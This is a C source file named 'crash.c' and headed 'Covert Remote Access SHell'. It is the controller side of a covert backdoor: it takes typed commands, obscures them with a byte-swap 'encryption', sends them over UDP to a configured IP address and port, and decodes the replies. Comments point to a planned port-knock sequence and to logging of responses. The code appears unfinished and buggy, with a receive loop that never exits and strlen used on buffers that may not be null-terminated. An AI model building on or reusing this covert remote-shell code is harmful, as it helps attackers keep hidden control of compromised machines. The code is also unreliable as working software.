/* * * * * * * * * * * * * * * * * * * *
 *  Source: crash.c:
 * 			Covert Remote Access SHell
 *  Functions:
 *  Date:
 *  Revisions:
 *  Designers:
 *  Programmer: John Warren
 *  Usage:
 *  Notes:
 *
 * * * * * * * * * * * * * * * * * * * */
#include "lcfg.h"
char iter=0;

int main (int argc,char **argv){
	int i,psz, msz,done=0;
	unsigned char rcmd[BUFSZ],sbuf[BUFSZ];
	char * msg = (char *)calloc(BUFSZ, sizeof(char));
	int sockfd, nBytes, ch;
	struct sockaddr_in addr_con;
	int addrlen = sizeof(addr_con);
	addr_con.sin_family = AF_INET;
	addr_con.sin_port = htons(PORT_NO);
	addr_con.sin_addr.s_addr = inet_addr(IP_ADDRESS);

	//read command line
	load_cfg();
	get_args(argc,argv);
	psz=strlen(prf.pass);

	// create connection(tcp,udp,icmp)
	sockfd = socket(AF_INET, SOCK_DGRAM,
					IP_PROTOCOL);

	if (sockfd < 0)
		printf("\nfile descriptor not received!!\n");
	else
		printf("\nfile descriptor %d received\n", sockfd);


 	while (1) {
		msz = getrcmd(msg);
		printf("\n%d %s\n\n",msz,msg);
		if (msz==0 || strncmp(msg, "x", strlen(msg)-1) == 0 || strncmp(msg, "exit", strlen(msg)-1) == 0 || done==1){
			done=1;
			break;
		}
		sprintf(rcmd,"%x%s",msz,msg);
//		sprintf(rcmd,"%s",msg);

		printf("Unencrypted >>> [%s]\n",rcmd);
	 	// encapsulate message(encrypt, add: len, string) pass, cmd, args
		printf("Encrypted >>> ");
	  for(i=0;i<strlen(rcmd);i++){
	  	sbuf[i]=swapIN(rcmd[i]);
			printf("%c[%x|%x]",rcmd[i],rcmd[i],sbuf[i]);
	  }

		printf("\n");

		// send knock sequence (tbd)
		// send message
		sendto(sockfd, sbuf, BUFSZ,
			sendrecvflag, (struct sockaddr*)&addr_con,
			addrlen);
			// wait for response
		printf("\n--------->  Waitincrag for response <---------\n");
		while (1) {
			// receive

			nBytes = recvfrom(sockfd, rcmd, BUFSZ,
							sendrecvflag, (struct sockaddr*)&addr_con,
							&addrlen);
			for(i=0;i<strlen(rcmd);i++){
		  	sbuf[i]=swapIN(rcmd[i]);
				printf("%c[%x|%x]",rcmd[i],rcmd[i],sbuf[i]);
		  }
			printf("\n---------Data Received---------\n");
			printf("Unencrypted >>> [%s]\n",sbuf);

		}
		printf("\n-------------------------------\n");

		// decapsulate message (decrypt, parse : len, string) pass, response
		// until done
		// save response to file(cmd_dt.txt)
		//sendcmd(fp,message);
		//getresp()
		//
	}
	// join thread

}
